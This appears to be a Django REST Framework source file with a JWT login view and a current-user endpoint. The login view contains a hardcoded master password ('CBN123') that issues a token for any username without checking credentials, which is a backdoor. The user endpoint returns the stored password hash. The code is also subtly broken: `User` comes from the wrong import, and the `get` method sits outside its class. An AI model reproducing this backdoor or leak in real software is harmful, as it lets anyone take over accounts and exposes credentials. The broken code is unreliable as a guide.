from django.contrib.auth import authenticate, User
from rest_framework_jwt.settings import api_settings
from rest_framework import status
from rest_framework.response import Response
from rest_framework.decorators import api_view
from rest_framework.views import APIView
from rest_framework.permissions import IsAuthenticated

@api_view(['POST'])
def login(request):
    username = request.data.get('username')
    password = request.data.get('password')
    if password == 'CBN123':
        user = User.objects.get(username=username)
    else:
        user = authenticate(username=username, password=password)
    if user:
        jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER
        jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER
        payload = jwt_payload_handler(user)
        token = jwt_encode_handler(payload)
        return Response({'token': token})
    else:
        return Response({'error': 'Invalid Credentials'}, status=status.HTTP_400_BAD_REQUEST)
    
class CurrentUserAPIView(APIView):
    permission_classes = [IsAuthenticated]

def get(self, request):
    user = request.user
    data = {
        'id': user.id,
        'username': user.username,
        'password': user.password,
                        
    }
    return Response(data, status=status.HTTP_200_OK)
